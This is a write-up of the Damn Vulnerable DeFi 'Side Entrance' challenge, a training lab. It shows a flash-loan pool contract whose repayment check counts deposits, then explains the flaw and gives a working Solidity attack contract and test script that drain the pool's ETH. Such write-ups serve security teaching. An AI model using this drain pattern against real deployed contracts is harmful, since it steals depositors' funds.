# 04_SideEntrance

## Challenge

A surprisingly simple pool allows anyone to deposit ETH, and withdraw it at any point in time.

It has 1000 ETH in balance already, and is offering free flash loans using the deposited ETH to promote their system.

Starting with 1 ETH in balance, pass the challenge by taking all ETH from the pool.

You are provided with the code for the flashloan providing pool:

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "solady/src/utils/SafeTransferLib.sol";

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

/**
 * @title SideEntranceLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract SideEntranceLenderPool {
    mapping(address => uint256) private balances;

    error RepayFailed();

    event Deposit(address indexed who, uint256 amount);
    event Withdraw(address indexed who, uint256 amount);

    function deposit() external payable {
        unchecked {
            balances[msg.sender] += msg.value;
        }
        emit Deposit(msg.sender, msg.value);
    }

    function withdraw() external {
        uint256 amount = balances[msg.sender];
        
        delete balances[msg.sender];
        emit Withdraw(msg.sender, amount);

        SafeTransferLib.safeTransferETH(msg.sender, amount);
    }

    function flashLoan(uint256 amount) external {
        uint256 balanceBefore = address(this).balance;

        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

        if (address(this).balance < balanceBefore)
            revert RepayFailed();
    }
}
```

## Solution

Here we once again have the same issue. We are only checking for our balance being the same before and after the loan. 

We can abuse this by just using the flash loan to call the deposit() function passing it all the value we received from our loan (balance of the contract). When it comes to the possible revert, the balance is still the same and the flash loan finishes. But now we have all the money assigned to us using balances and can just withdraw it using the withdraw() function. I once again wrote a simple attack contract:

```solidity
// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";
import "../DamnValuableToken.sol";

contract Attack_SideEntrance {

    address owner;

    function getEmBoyz(address _pool) public
    {
        SideEntranceLenderPool(_pool).flashLoan(_pool.balance);
        SideEntranceLenderPool(_pool).withdraw();
        msg.sender.call{value: address(this).balance}("");
    }

    function execute() external payable
    {
        SideEntranceLenderPool(msg.sender).deposit{value: msg.value}();
    } 

    receive() external payable
    {
        
    }  
}
```

We can then just deploy and call this in the testscript the same way as we did before:

```js
it('Execution', async function () {
    /** CODE YOUR SOLUTION HERE */

    const Attack_SideEntrance = await ethers.getContractFactory('Attack_SideEntrance', player);
    attack = await Attack_SideEntrance.deploy();
    await attack.connect(player).getEmBoyz(pool.address);
});
```

This works and finishes the challenge.
